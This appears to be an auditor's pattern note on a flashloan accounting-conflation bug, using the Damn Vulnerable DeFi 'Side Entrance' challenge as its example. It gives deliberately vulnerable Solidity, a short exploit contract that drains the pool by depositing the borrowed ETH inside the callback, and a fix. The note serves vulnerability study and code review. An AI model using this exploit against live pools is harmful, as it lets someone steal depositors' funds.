# Pattern: Flashloan Repayment via Balance Conflation

**Family:** Accounting Conflation / Balance-Based Validation
**Exploitation chain:** flashloan → deposit-in-callback → withdraw

**Reference example:** Damn Vulnerable DeFi v4 — Side Entrance
**Severity when present:** Critical (total drain of the pool)
**Detection by Slither/Aderyn:** NO
**Solodit tags:** flashloan, accounting-conflation, repayment-check, balance-based-validation

---

## Description

A flashloan pool verifies repayment by comparing the contract's native balance
before and after the callback:

```solidity
uint256 balanceBefore = address(this).balance;
IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
if (address(this).balance < balanceBefore) revert RepayFailed();
```

If the pool exposes a deposit function that (a) accepts ETH and (b) is
callable during the flashloan window, the attacker can call it
from `execute()`. The native balance is restored (satisfying the check),
but the internal ledger credits those funds to the attacker, who withdraws them
afterwards with `withdraw()`.

The same ETH satisfies two accounting obligations simultaneously:
- Repayment of the loan (via the native balance)
- A new deposit (via the internal mapping)

---

## Minimal vulnerable code

```solidity
mapping(address => uint256) public balances;

function deposit() external payable {
    balances[msg.sender] += msg.value;   // System 1: ledger
}

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) revert RepayFailed(); // System 2: native
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    delete balances[msg.sender];
    SafeTransferLib.safeTransferETH(msg.sender, amount);
}
```

---

## Exploit pattern

```solidity
function execute() external payable {
    pool.deposit{value: msg.value}();  // flashloaned ETH → legitimate deposit
}

function attack() external {
    pool.flashLoan(address(pool).balance);  // borrow everything
}

function drain() external {
    pool.withdraw();                                         // withdraw the fake credit
    SafeTransferLib.safeTransferETH(recovery, address(this).balance);
}
```

---

## Necessary conditions

Three conditions must hold simultaneously:

1. **Repayment based on the native balance** — `address(this).balance >= balanceBefore`
2. **A capital-entry function callable from the callback** — `deposit()`, `mint()`, `stake()` with no guard
3. **An internal ledger decoupled from the native balance** — `balances[]` does not check whether the funds come from an active flashloan

---

## Why this is NOT classic reentrancy

Classic reentrancy requires reading inconsistent intermediate state (a CEI violation).
There is no CEI violation here:
- `deposit()` is atomic and correct in isolation
- `flashLoan()` is atomic and correct in isolation
- The bug emerges from the **interaction between two correct functions** that share
  the same ETH but use different accounting mechanisms

Classifying it as "reentrancy" leads you to look for `nonReentrant` as the fix. The correct
fix is to track the origin of the funds, not to prevent re-entry.

**Correct label:** accounting conflation / balance-based repayment check
**Incorrect label:** reentrancy

---

## Correct fix

Explicitly track borrowed funds that are pending repayment:

```solidity
uint256 private _flashLoanActive;

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    _flashLoanActive = amount;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    _flashLoanActive = 0;
    if (address(this).balance < balanceBefore) revert RepayFailed();
}

function deposit() external payable {
    if (_flashLoanActive > 0) revert DepositDuringFlashloan();
    balances[msg.sender] += msg.value;
}
```

Or use `nonReentrant` on `flashLoan()` AND on `deposit()` (sharing the
same lock via the standard OZ ReentrancyGuard) — less semantic than the
explicit flag above, but effective for this family. Critical:
putting `nonReentrant` only on `deposit()` does NOT work — the guard never
engages because `flashLoan()` never touches the lock.

---

## Red flags in code review

- `address(this).balance` as the only repayment mechanism
- `deposit()` / `mint()` callable with no guard during the flashloan window
- Two accounting systems over the same asset (native + mapping)
- No "flash loan active" flag or lock

---

## Related family

- [erc4626-totalassets-balanceof.md](erc4626-totalassets-balanceof.md) — same family: balance-based validation
  that does not track the source/purpose of the funds. In ERC4626 it is `totalAssets()`
  (which uses `balanceOf(address(this))`) vs shares. Here it is `address(this).balance`
  vs `balances[]`.

---

## Known instances

| Instance | Date | Ref |
|-----------|-------|-----|
| Damn Vulnerable DeFi v4 — Side Entrance | — | training challenge |
